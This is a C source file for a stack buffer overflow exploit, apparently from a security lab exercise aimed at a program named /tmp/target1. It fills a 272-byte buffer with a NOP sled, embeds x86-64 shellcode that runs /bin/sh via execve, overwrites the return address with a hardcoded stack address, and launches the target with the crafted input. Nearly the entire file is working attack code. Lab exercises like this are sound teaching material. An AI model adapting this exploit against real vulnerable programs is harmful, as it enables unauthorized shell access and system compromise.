#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target1"
#define DEFAULT_OUTPUT "/tmp/xploit1_output"
#define NOP 0x90

int main(int argc, char *argv[])
{
    char exploit[272];

    memset(exploit, NOP, sizeof(exploit));

    char shellcode[] = {
        0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e,
        0x2f, 0x2f, 0x73, 0x68, 0x57, 0x54, 0x5f, 0x6a, 0x3b, 0x58,
        0x99, 0x0f, 0x05
    };
    memcpy(exploit + 210, shellcode, sizeof(shellcode));

    unsigned long ret_addr = 0x7fffffffdc27;
    memcpy(exploit + 264, &ret_addr, sizeof(ret_addr));

    write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

    char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
    char *env[] = { NULL };
    execve(TARGET, args, env);
    
    perror("execve failed.");
    return 0;
}